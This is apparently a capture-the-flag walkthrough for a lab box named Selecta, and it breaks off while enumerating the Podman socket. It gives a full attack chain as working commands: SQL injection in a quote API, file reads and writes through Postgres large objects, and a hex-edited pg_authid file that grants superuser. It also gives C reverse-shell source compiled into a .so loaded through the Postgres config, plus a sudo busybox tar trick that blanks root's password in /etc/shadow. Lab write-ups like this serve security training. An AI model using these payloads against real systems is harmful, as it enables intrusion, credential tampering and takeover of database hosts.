# Selecta Walkthrough

This is the walkthrough for the Selecta CTF box.

It is highly recommended to pull a postgres:13 container, so you can do some research and testing before trying things on the box itself.

## Enumeration

If you portscan, you will find a web server on port 8000. The web site is a random quote generator from the Hitchhikers Guide to the Galaxy:

![image.png](image%201.png)

There is a `script.js` file that does the heavy lifting:

```jsx
// Function to fetch and display the random quote
async function loadRandomQuote() {
    // Generate a random number between 1 and 42
    const randomNumber = Math.floor(Math.random() * 42) + 1;
    // Replace 'YOUR_API_URL' with the actual API URL
    const apiUrl = window.location.href + 'quotes?id='+randomNumber;
    
    // Fetch quote data from the API
    const response = await fetch(apiUrl);

    if (!response.ok) {
        // console.log("Response error");
        throw new Error('Failed to fetch quote');
    }

    const data = await response.json();

    // console.log("Got data");
    document.getElementById('quoteContainer').innerText = data[0].quote || "No quote found.";
}

// Load the random quote when the page is loaded
$(document).ready(function() {
    loadRandomQuote();
});
```

It generates a random number between 1 and 42 and then queries the web site for a quote, using the URL `quotes?id=NUMBER`

So, first idea is to test for SQL injection in the `id` parameter (use jq, as the result is JSON):

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode 'id=-1 OR 1=1' | jq
```

Yep:

```json
[
  {
    "id": 1,
    "quote": "For instance, on the planet Earth, man had always assumed that he was more intelligent than dolphins because he had achieved so much—the wheel, New York, wars and so on—whilst all the dolphins had ever done was muck about in the water having a good time. But conversely, the dolphins had always believed that they were far more intelligent than man—for precisely the same reasons."                                                                                                                                                                                                                                                                                                                                     
  },
  {
    "id": 2,
    "quote": "He felt that his whole life was some kind of dream and he sometimes wondered whose it was and whether they were enjoying it."
  },
  {
    "id": 3,
    "quote": "This planet has—or rather had—a problem, which was this: most of the people living on it were unhappy for pretty much of the time. Many solutions were suggested for this problem, but most of these were largely concerned with the movement of small green pieces of paper, which was odd because on the whole it wasn't the small green pieces of paper that were unhappy."                                                                                                                                                                                                                                                                                                                                                    
  },
  {
    "id": 4,
    "quote": "One of the things Ford Prefect had always found hardest to understand about humans was their habit of continually stating and repeating the very very obvious."
  },
  {
    "id": 5,
    "quote": "Far out in the uncharted backwaters of the unfashionable end of the western spiral arm of the Galaxy lies a small unregarded yellow sun. Orbiting this at a distance of roughly ninety-two million miles is an utterly insignificant little blue green planet whose ape-descended life forms are so amazingly primitive that they still think digital watches are a pretty neat idea."                                                                                                                                                                                                                                                                                                                                            
  },

...
```

## SQL injection

So, let’s try some things:

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode 'id=-1; SELECT version()'
     
{"error":"ERROR: cannot insert multiple commands into a prepared statement (SQLSTATE 42601)"}
```

The application uses prepared statements, so no stacked queries.

`UPDATE` and `DELETE` don’t work either:

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 OR (UPDATE * SET quote='lalala' where id=43)"

{"error":"ERROR: syntax error at or near \"quote\" (SQLSTATE 42601)"}                                                                                                                                                                                                                                                                                                                                                                        

curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 OR (DELETE FROM quotes where id=43)"         

{"error":"ERROR: syntax error at or near \"FROM\" (SQLSTATE 42601)"}             
```

So, we probably need NESTED SELECT queries…

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,(SELECT version())"

[{"id":42,"quote":"PostgreSQL 13.13 (Debian 13.13-1.pgdg120+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit"}]   
```

`UNION SELECT` works,

This is a good moment to pull a copy of the official `postgres` docker container that will help in testing things and finding where files are located. We even need it later as a base image for when we need to develop a postgres compatible .so file.

```bash
docker pull postgres:13.13
```

Who are we in the database?

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,(SELECT CURRENT_USER)"

[{"id":42,"quote":"poc_user"}]                                                                                                                                                                                                                                                                                                                                                                        

curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,(SELECT CURRENT_ROLE)"

[{"id":42,"quote":"poc_user"}]                                                                         
```

We are some regular user, not a superuser.

Try to get some more information, let’s query for the database name:

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,(SELECT current_database())"

[{"id":42,"quote":"postgres"}]
```

So, our quotes are in the `postgres` database.

The table is `quotes`:

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,(SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE')"

[{"id":42,"quote":"quotes"}]
```

So, we have some information, but we can only perform (nested) SELECT statements.

Do we have access to the filesystem (using large objects)? Can we read files?

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,(CAST((SELECT lo_import('/etc/passwd', 1)) AS text))"

[{"id":42,"quote":"1"}]                                                 

curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_get(1)) AS text)"
               
[{"id":42,"quote":"\\x726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a34323a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a706f7374677265733a783a3939393a3939393a3a2f7661722f6c69622f706f737467726573716c3a2f62696e2f626173680a"}] 
```

Yes, and when we decode the hex blob we get the `/etc/passwd` file:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
postgres:x:999:999::/var/lib/postgresql:/bin/bash
```

Can we write files?

```bash
echo "Theart42 was here" > dummy.txt

curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_from_bytea(2, decode('$(base64 -w 0 dummy.txt)', 'base64'))) AS text);" 

[{"id":42,"quote":"2"}]

curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_export(2, '/tmp/theart42.txt')) AS text);"

[{"id":42,"quote":"1"}] 
```

Try to read it back:

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,(CAST((SELECT lo_import('/tmp/theart42.txt', 3)) AS text))"

[{"id":42,"quote":"3"}]

curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_get(3)) AS text)" | jq -r '.[].quote' | sed -e 's/^\\x//' | xxd -r -p

Theart42 was here
```

Ok, we can write files as well.

Dropping a reverse shell this way will not work, the server is not running PHP or some other easy framework, and there is no way of triggering the reverse shell.

So… let’s enumerate further, digging into Postgres internals, because we need RCE, right?

Our table quotes is on this relative file path:

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,pg_relation_filepath('quotes')" | jq -r '.[].quote'
                                  
base/13468/16386
```

We can try to get the full path, but we lack permissions:

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,(SELECT setting FROM pg_settings WHERE name='data_directory');"

{"error":"can't scan into dest[1]: cannot scan null into *string"} 

curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,(select setting from pg_settings where name='config_file');"

{"error":"can't scan into dest[1]: cannot scan null into *string"}  
```

Try to find the relative path of `pg_authid` , this contains the authentication settings for the database users:

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,(SELECT pg_relation_filepath('pg_authid'))" | jq -r '.[].quote'

global/1260
```

The structure of the directories and files in the container is like this:

```bash
base_path -> data -> global -> 1260
```

The trick is to find the `basepath` by enumerating over a limited list of possibilities.

In (non-docker) installations the path looks like this:

```bash
/var/lib/postgresql/13/main/global/1260
```

However, in a docker container, it looks like this:

```bash
/var/lib/postgresql/data/global/1260
```

(For convenience, we made a symlink from `13/main` to `data`):

![image.png](image%202.png)

We can try both basepaths and try to read the raw `pg_authid` file:

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,(CAST((SELECT lo_import('/var/lib/postgresql/13/main/global/1260', 4)) AS text))"

[{"id":42,"quote":"4"}]

curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_get(4)) AS text)" | jq -r '.[].quote' | sed -e 's/^\\x//' | xxd -r -p > pg_authid
ls -l pg_authid

-rw-rw-r-- 1 theart42 theart42 8192 Oct 27 09:19 pg_authid
```

Ok, that worked, let’s examine the file:

`xxd pg_authid` shows the hex dump, with some interesting bits:

![image.png](image%203.png)

We see our `poc_user` role with binary data, and we see the `postgres` role with all the privileges. We also see the (MD5!) hashed passwords of the roles, but as we don’t have direct acecss to postgres port, there’s not much we can do with it (if we can even dehash them).

So is there a way to get more information about the binary structure? (as you can imagine it differs from major postgres version to major postgres version). Luckily there is:

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,STRING_AGG(CONCAT_WS(',',attname,typname,attlen,attalign),';') FROM pg_attribute JOIN pg_type ON pg_attribute.atttypid = pg_type.oid JOIN pg_class ON pg_attribute.attrelid = pg_class.oid WHERE pg_class.relname = 'pg_authid'" | jq -r '.[].quote'

tableoid,oid,4,i;cmax,cid,4,i;xmax,xid,4,i;cmin,cid,4,i;xmin,xid,4,i;ctid,tid,6,s;oid,oid,4,i;rolname,name,64,c;rolsuper,bool,1,c;rolinherit,bool,1,c;rolcreaterole,bool,1,c;rolcreatedb,bool,1,c;rolcanlogin,bool,1,c;rolreplication,bool,1,c;rolbypassrls,bool,1,c;rolconnlimit,int4,4,i;rolpassword,text,-1,i;rolvaliduntil,timestamptz,8,d
```

We don’t need to understand / manipulate the whole structure, we’re interested in the permission flags, and particularly the `rolsuper`flag. We can use the rolname as an anchor to find these flags in the binary structure. The rolname is a 64 character string, which is then followed directly by 7 flags, each 1 character (byte).

The `poc_user` permissions are:

![image.png](image%204.png)

And for `postgres`:

![image.png](image%205.png)

The one for postgres has 7 `01` bytes (corresponding to all privileges), and the one for poc_user only has 2 (for the rolinherit and rolcanlogin privileges).

We can edit this file with a hexeditor and set the missing flags for poc_user (save the edited version as `pg_authid.new` to prevent overwriting the old one):

![image.png](image%206.png)

We can upload the ‘enhanced’ pg_authid file and see what happens.

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_from_bytea(5, decode('$(base64 -w 0 pg_authid.new)', 'base64'))) AS text)"
                                                                                                                                          
[{"id":42,"quote":"5"}]

curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_export(5, '/var/lib/postgresql/13/main/global/1260')) AS text)" 

[{"id":42,"quote":"1"}]
```

So, we have now overwritten the `pg_authid` file, but the information is still cached in the database. We need to flush/invalidate the cache so the information is re-read from disk.

We can do that by requesting big blobs in the database. We request a 128MB blob, in most cases the internal cache for Postgres is set to 128MB (in the container it is set to 8MB). You may need to do this multiple times, in my case I had to do this 3 times (don’t forget to update the number 1000, which is the object id):

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_from_bytea(1000, (SELECT REPEAT('a', 128*1024*1024))::bytea)) AS text)"
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_from_bytea(1001, (SELECT REPEAT('a', 128*1024*1024))::bytea)) AS text)"
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_from_bytea(1002, (SELECT REPEAT('a', 128*1024*1024))::bytea)) AS text)"
```

Postgres is a bit weird, the permissions you got when connecting stay with you until you reconnect, so we need to enforce a reconnect to get the new privileges. Looking at the HTML source code:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your daily HGTTG quote</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* Custom style for quote text */
        .quote-text {
            font-family: 'Georgia', serif;
            font-size: 1.5rem;
            color: #333;
            padding: 20px;
            border-left: 5px solid #007bff;
        }
    </style>
</head>
<body>
    <h1>{{ .title }}</h1>
    <div class="container mt-5 text-center">
        <h1 class="mb-4">The Hitchhikers Guide says:</h1>
        <div id="quoteContainer" class="quote-text">Loading...</div>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="/static/script.js"></script>
    <!-- if you experience issues with the quotes, or miss new ones, reconnect via /reconnect endpoint --> 
</body>
</html>
```

This shows there is a `/reconnect` endpoint for resolving database issues.

After running it:

```bash
curl -s 'http://172.17.0.2:8000/reconnect'

"OK"   
```

We can retrieve the information from `pg_settings`:

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,(SELECT setting FROM pg_settings WHERE name='config_file')"

[{"id":42,"quote":"/etc/postgresql/postgresql.conf"}]
```

So, we’re probably running with superuser privileges now. Let’s try reloading the configuration, if that works, we’re superuser for sure.

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT pg_reload_conf()) AS text)"                   

[{"id":42,"quote":"true"}]
```

That works, so let’s download the config file:

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,(CAST((SELECT lo_import('/etc/postgresql/postgresql.conf', 10)) AS text))"

[{"id":42,"quote":"10"}]
                                                                                                                                                                                                                                                                                                                                                                             
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_get(10)) AS text)" | jq -r '.[].quote' | sed -e 's/^\\x//' | xxd -r -p

# Override file for Docker, complete config is in /var/lib/postgresql/data/postgresql.conf

# Listen on all IP addresses
listen_addresses = '*'

# Other PostgreSQL configurations (optional)
max_connections = 100
shared_buffers = 8MB
```

## Reverse shell

To get a reverse shell, we can use `.so` files that are loaded by postgres under various conditions. The easiest is to define a `payload.so` file that is called when a new connection is initiated to the database. We can change the config file to add that event and a PATH for searching the shared object files:

```bash
# Listen on all IP addresses
listen_addresses = '*'

# Other PostgreSQL configurations (optional)
max_connections = 100
shared_buffers = 8MB
session_preload_libraries = 'payload.so'
dynamic_library_path = '/tmp:$libdir'
```

We first need to prepare a `payload.so` file. For this, we need a development environment that matches the version of postgres. We can use the Docker container mentioned earlier as a basis and create a new container with a build environment:

```docker
# Use the official PostgreSQL image as the base
FROM docker.io/postgres:13.13

ENV POSTGRES_PASSWORD=lalalala

# Install build tools and PostgreSQL development libraries
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
    build-essential \
    gcc \
    make \
    libpq-dev \
    postgresql-server-dev-all && \
    rm -rf /var/lib/apt/lists/*

# Set working directory for library source code
WORKDIR /usr/src/app

# Run the PostgreSQL server
CMD ["postgres"]
```

We can build the container:

```bash
docker build -t dev_postgres .
```

After building the container we run it:

```bash
docker run --rm --name dev-postgres -v $(pwd):/usr/src/app -d dev_postgres
```

We map our current directory to `/usr/src/app` in the container.

Our current directory contains code for a reverse shell:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
    /*
        code taken from https://www.revshells.com/
    */

    int port = 12345;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("172.17.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/bash", NULL};
    execve("/bin/bash", argv, NULL);
}
```

And I made a simple compile script to compile. As the code is contained in `_init` we do not need startupfiles:

```bash
#!/bin/bash

rm -f *.o *.so

gcc \
-I/usr/include/postgresql/13/server \
-shared \
-fPIC \
-nostartfiles \
-o payload.so \
payload.c
```

If all goes well, it will compile `payload.c` into `payload.so` :

```bash
docker exec -it dab824f0eaf4 /bin/bash
                
root@dab824f0eaf4:/usr/src/app# cd /usr/src/app
root@dab824f0eaf4:/usr/src/app# ls -l
total 28
-rwxrwxr-x 1 1000 1000   133 Oct 25 07:10 compile.sh
-rw-rw-r-- 1 1000 1000  1068 Oct 25 07:02 Dockerfile
-rw-rw-r-- 1 1000 1000   806 Oct 25 07:05 payload.c

root@dab824f0eaf4:/usr/src/app# ./compile.sh

root@dab824f0eaf4:/usr/src/app# ls -l
total 28
-rwxrwxr-x 1 1000 1000   133 Oct 25 07:10 compile.sh
-rw-rw-r-- 1 1000 1000  1068 Oct 25 07:02 Dockerfile
-rw-rw-r-- 1 1000 1000   806 Oct 25 07:05 payload.c
-rwxr-xr-x 1 root root 14336 Oct 27 09:57 payload.so

docker stop dab824f0eaf4
```

We can now upload this file to the target, and then upload our new config file.

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_from_bytea(11, decode('$(base64 -w 0 payload.so)', 'base64'))) AS text);"

[{"id":42,"quote":"11"}]

curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_export(11, '/tmp/payload.so')) AS text);"

[{"id":42,"quote":"1"}]
```

We upload the new `postgresql.conf` as well:

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_from_bytea(12, decode('$(base64 -w 0 postgresql.conf.new)', 'base64'))) AS text);"

[{"id":42,"quote":"12"}]                                                                                                                                                                                                                                                                                                                                                                             

curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT lo_export(12, '/etc/postgresql/postgresql.conf')) AS text);"         

[{"id":42,"quote":"1"}]                                                                                                                                                                                                                                                                                                                                                                             
```

Start a netcat listener on port 12345 (or whatever port you’ve chosen)

Reload the postgres configuration

```bash
curl -s 'http://172.17.0.2:8000/quotes' --data-urlencode "id=-1 UNION SELECT 42,CAST((SELECT pg_reload_conf()) AS text)"
```

and run the `/reconnect` endpoint again:

```bash
nc -lnvp 12345        
listening on [any] 12345 ...

connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 48782
```

Allocate a pty and run some commands:

```bash
script -q /dev/null
/bin/bash -i

ls -al

total 132
drwx------ 19 postgres postgres  4096 Oct 27 10:27 .
drwxr-xr-x  1 postgres postgres  4096 Oct 27 10:27 ..
-rw-------  1 postgres postgres     3 Oct 27 10:27 PG_VERSION
drwx------  5 postgres postgres  4096 Oct 27 10:27 base
drwx------  2 postgres postgres  4096 Oct 27 10:28 global
drwx------  2 postgres postgres  4096 Oct 27 10:27 pg_commit_ts
drwx------  2 postgres postgres  4096 Oct 27 10:27 pg_dynshmem
-rw-------  1 postgres postgres  4782 Oct 27 10:27 pg_hba.conf
-rw-------  1 postgres postgres  1636 Oct 27 10:27 pg_ident.conf
drwx------  4 postgres postgres  4096 Oct 27 10:33 pg_logical
drwx------  4 postgres postgres  4096 Oct 27 10:27 pg_multixact
drwx------  2 postgres postgres  4096 Oct 27 10:27 pg_notify
drwx------  2 postgres postgres  4096 Oct 27 10:27 pg_replslot
drwx------  2 postgres postgres  4096 Oct 27 10:27 pg_serial
drwx------  2 postgres postgres  4096 Oct 27 10:27 pg_snapshots
drwx------  2 postgres postgres  4096 Oct 27 10:27 pg_stat
drwx------  2 postgres postgres  4096 Oct 27 10:33 pg_stat_tmp
drwx------  2 postgres postgres  4096 Oct 27 10:27 pg_subtrans
drwx------  2 postgres postgres  4096 Oct 27 10:27 pg_tblspc
drwx------  2 postgres postgres  4096 Oct 27 10:27 pg_twophase
drwx------  3 postgres postgres  4096 Oct 27 10:33 pg_wal
drwx------  2 postgres postgres  4096 Oct 27 10:27 pg_xact
-rw-------  1 postgres postgres    88 Oct 27 10:27 postgresql.auto.conf
-rw-------  1 postgres postgres 28156 Oct 27 10:27 postgresql.conf
-rw-------  1 postgres postgres    87 Oct 27 10:27 postmaster.opts
-rw-------  1 postgres postgres    94 Oct 27 10:27 postmaster.pid

id
uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
postgres@c6798a3cb214:/$ 
```

And we have a shell!!!

If you lose the shell, or when the postgres connection times out, you may see this error:

```bash
curl -s 'http://192.168.1.5:8000/reconnect'

"failed to connect to `host=localhost user=poc_user database=postgres`: failed to receive message (unexpected EOF)"  
```

You should still be able to call `/reconnect` again (if you lose the shell) and get a new shell (don't forget to start `nc -lnvp 12345` again ;)


User `postgres` can sudo busybox tar:

```bash
sudo -l

Matching Defaults entries for postgres on c6798a3cb214:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User postgres may run the following commands on c6798a3cb214:
    (ALL) NOPASSWD: /usr/bin/busybox tar *
```

In a directory like `/tmp` we can copy the `/etc/shadow` file:

```bash
sudo busybox tar cvf - /etc/shadow | tar xvf -

cat etc/shadow

root:*:19752:0:99999:7:::
daemon:*:19752:0:99999:7:::
bin:*:19752:0:99999:7:::
sys:*:19752:0:99999:7:::
sync:*:19752:0:99999:7:::
games:*:19752:0:99999:7:::
man:*:19752:0:99999:7:::
lp:*:19752:0:99999:7:::
mail:*:19752:0:99999:7:::
news:*:19752:0:99999:7:::
uucp:*:19752:0:99999:7:::
proxy:*:19752:0:99999:7:::
www-data:*:19752:0:99999:7:::
backup:*:19752:0:99999:7:::
list:*:19752:0:99999:7:::
irc:*:19752:0:99999:7:::
_apt:*:19752:0:99999:7:::
nobody:*:19752:0:99999:7:::
postgres:!:19753::::::
```

We can ‘edit’ the file with `busybox sed`:

```bash
busybox sed -i -e '/^root/s/\*//' etc/shadow
```

Which gives us:

```bash
root::19752:0:99999:7:::
daemon:*:19752:0:99999:7:::
bin:*:19752:0:99999:7:::
sys:*:19752:0:99999:7:::
sync:*:19752:0:99999:7:::
games:*:19752:0:99999:7:::
man:*:19752:0:99999:7:::
lp:*:19752:0:99999:7:::
mail:*:19752:0:99999:7:::
news:*:19752:0:99999:7:::
uucp:*:19752:0:99999:7:::
proxy:*:19752:0:99999:7:::
www-data:*:19752:0:99999:7:::
backup:*:19752:0:99999:7:::
list:*:19752:0:99999:7:::
irc:*:19752:0:99999:7:::
_apt:*:19752:0:99999:7:::
nobody:*:19752:0:99999:7:::
postgres:!:19753::::::
```

Repack the file in a tar archive (still in the `/tmp` directory), and then extract to overwrite the system file:

```bash
tar cvf shadow.tar etc
cd /
sudo busybox tar -o --overwrite -x -v -f /tmp/shadow.tar
```

We can now `su` to root:

```bash
su -

root@c6798a3cb214:~# ls -al
ls -al
total 24
drwx------ 1 root root 4096 Oct 27 10:39 .
drwxr-xr-x 1 root root 4096 Oct 27 10:27 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
-rw------- 1 root root  100 Oct 27 10:39 .psql_history
-rw-r--r-- 1 root root  165 Jan 31  2024 .wget-hsts
```

And we have pwned the container.

## Privilege escalation

The pain is not over yet, we now need to escape from the container.

Note that we don't have a fully functioning shell, and to be able to continue we need some files. The best thing
to do is to prepare these files on your attacking machine and then pull them in with curl.

Use (Podman)[https://docs.podman.io/en/latest/_static/api.html] for the definition of the REST API.

Looking around, we find a file `/var/run/podman/podman.sock` so we’re probably in a Podman (rootless) container:

```bash
curl -s--unix-socket /var/run/podman/podman.sock http://d/v4.0.2/libpod/containers/json | jq
```

And we get:

```json
[
  {
    "AutoRemove": true,
    "Command": [
      "postgres",
      "-c",
      "config_file=/etc/postgresql/postgresql.conf"
    ],
    "Created": "2024-10-31T14:48:08.528980731Z",
    "CreatedAt": "",
    "Exited": false,
    "ExitedAt": -62135596800,
    "ExitCode": 0,
    "Id": "e5ecaa10b9b756311174f71a698b96fbf8dd6cea1fc48ce39ed7e3c1e362049a",
    "Image": "localhost/poc:latest",
    "ImageID": "69696d168b7eb345e9efcf6e1dba29f17ef8f981ca77b9e3e70b4f7307452f86",
    "IsInfra": false,
    "Labels": {
      "io.buildah.version": "1.23.1"
    },
    "Mounts": [
      "/var/run/podman/podman.sock",
      "/var/lib/postgresql/data"
    ],
    "Names": [
      "poc"
    ],
    "Namespaces": {},
    "Networks": null,
    "Pid": 15017,
    "Pod": "",
    "PodName": "",
    "Ports": [
      {
        "hostPort": 8000,
        "containerPort": 8000,
        "protocol": "tcp",
        "hostIP": ""
      }
    ],
    "Size": null,
    "StartedAt": 1730386088,
    "State": "running",
    "Status": ""
  }
```

Let’s inspect our container (as a courtesy, we’ve installed `js`) :

```bash
curl -s --unix-socket /var/run/podman/podman.sock http://d/v4.0.2/libpod/containers/e5ecaa10b9b756311174f71a698b96fbf8dd6cea1fc48ce39ed7e3c1e362049a/json | jq
```

And we get:

```json
{
  "Id": "e5ecaa10b9b756311174f71a698b96fbf8dd6cea1fc48ce39ed7e3c1e362049a",
  "Created": "2024-10-31T14:48:08.528980731Z",
  "Path": "docker-entrypoint.sh",
  "Args": [
    "postgres",
    "-c",
    "config_file=/etc/postgresql/postgresql.conf"
  ],
  "State": {
    "OciVersion": "1.0.2-dev",
    "Status": "running",
    "Running": true,
    "Paused": false,
    "Restarting": false,
    "OOMKilled": false,
    "Dead": false,
    "Pid": 15017,
    "ConmonPid": 15014,
    "ExitCode": 0,
    "Error": "",
    "StartedAt": "2024-10-31T14:48:08.629810536Z",
    "FinishedAt": "0001-01-01T00:00:00Z",
    "Healthcheck": {
      "Status": "",
      "FailingStreak": 0,
      "Log": null
    },
    "CgroupPath": "/user.slice/user-1000.slice/user@1000.service/user.slice/libpod-e5ecaa10b9b756311174f71a698b96fbf8dd6cea1fc48ce39ed7e3c1e362049a.scope"
  },
  "Image": "69696d168b7eb345e9efcf6e1dba29f17ef8f981ca77b9e3e70b4f7307452f86",
  "ImageName": "localhost/poc:latest",
  "Rootfs": "",
  "Pod": "",
  "ResolvConfPath": "/run/user/1000/containers/overlay-containers/e5ecaa10b9b756311174f71a698b96fbf8dd6cea1fc48ce39ed7e3c1e362049a/userdata/resolv.conf",
  "HostnamePath": "/run/user/1000/containers/overlay-containers/e5ecaa10b9b756311174f71a698b96fbf8dd6cea1fc48ce39ed7e3c1e362049a/userdata/hostname",
